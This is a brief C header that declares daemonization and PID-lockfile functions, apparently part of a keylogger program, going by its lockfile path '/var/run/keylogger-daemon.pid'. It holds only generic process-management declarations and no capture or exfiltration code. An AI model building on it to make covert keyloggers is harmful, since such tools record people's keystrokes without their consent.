/* Developed by Fabio Cinicolo */
#ifndef DAEMON
#define DAEMON

#define LOCKFILE "/var/run/keylogger-daemon.pid"

int daemonize(char * name);
int lockfile(int lock_file);
int daemonAlreadyRunning(int * lock_file);

#endif